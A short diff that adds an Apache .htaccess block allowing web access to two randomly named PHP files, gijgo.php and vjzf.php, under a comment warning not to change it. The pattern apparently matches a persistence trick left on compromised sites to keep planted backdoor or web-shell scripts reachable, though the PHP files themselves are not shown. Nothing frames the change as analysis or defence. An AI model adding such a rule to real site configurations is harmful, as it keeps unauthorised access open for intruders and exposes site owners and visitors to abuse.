@@ -1,0 +1,5 @@
+#---do-not-change-the-following-content---
+<FilesMatch '^(gijgo.php|vjzf.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
